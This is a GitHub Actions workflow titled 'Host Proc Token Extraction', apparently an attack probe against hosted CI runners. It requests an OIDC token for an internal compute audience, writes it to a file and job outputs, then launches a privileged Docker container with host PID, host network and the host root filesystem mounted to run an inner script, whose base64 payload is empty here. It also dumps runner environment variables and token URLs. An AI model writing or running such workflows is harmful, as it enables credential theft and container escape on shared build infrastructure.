name: "HC OIDC Primer v14 - Fixed JWT + Host Proc Token Extraction"
on:
  workflow_dispatch:
  push:
    branches: [main]
permissions:
  id-token: write
  contents: read
jobs:
  primer:
    runs-on: ubuntu-latest
    steps:
      - name: "Step 1: Get HC OIDC token AND write to file before docker"
        id: hc_token
        run: |
          RESPONSE=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://hosted-compute-ro")
          HC_JWT=$(echo "$RESPONSE" | jq -r '.value' 2>/dev/null)
          HC_JWT_LEN=$(printf '%s' "$HC_JWT" | wc -c)
          echo "HC_JWT_LEN=$HC_JWT_LEN"
          echo "$HC_JWT" > /tmp/hc_jwt.txt
          echo "hc_jwt=$HC_JWT" >> "$GITHUB_OUTPUT"
          echo "Written JWT len=$(wc -c < /tmp/hc_jwt.txt)"

      - name: "Step 2: Write inner script via python3"
        run: |
          python3 -c "
          import base64, os
          b64 = ''
          script = base64.b64decode(b64)
          with open('/tmp/inner_v14.sh', 'wb') as f: f.write(script)
          os.chmod('/tmp/inner_v14.sh', 0o755)
          print('Script written, len=', len(script))
          "

      - name: "Step 3: Run privileged docker with inner script + JWT file mounted"
        run: |
          echo "JWT file size: $(wc -c < /tmp/hc_jwt.txt)"
          docker run --rm --privileged --pid=host --network=host \
            -v /:/host \
            -v /tmp/inner_v14.sh:/inner.sh \
            -v /tmp/hc_jwt.txt:/hc_jwt.txt \
            alpine:latest /bin/sh /inner.sh

      - name: "Step 4: Runner env dump (outside docker)"
        run: |
          echo "=== RUNNER ENV KEYS ==="
          env | grep -i "ACTIONS\|RUNNER\|GITHUB" | sed 's/=.*/=<present>/' | sort
          echo "ACTIONS_ID_TOKEN_REQUEST_URL=$ACTIONS_ID_TOKEN_REQUEST_URL"
          echo "ACTIONS_RESULTS_URL=$ACTIONS_RESULTS_URL"
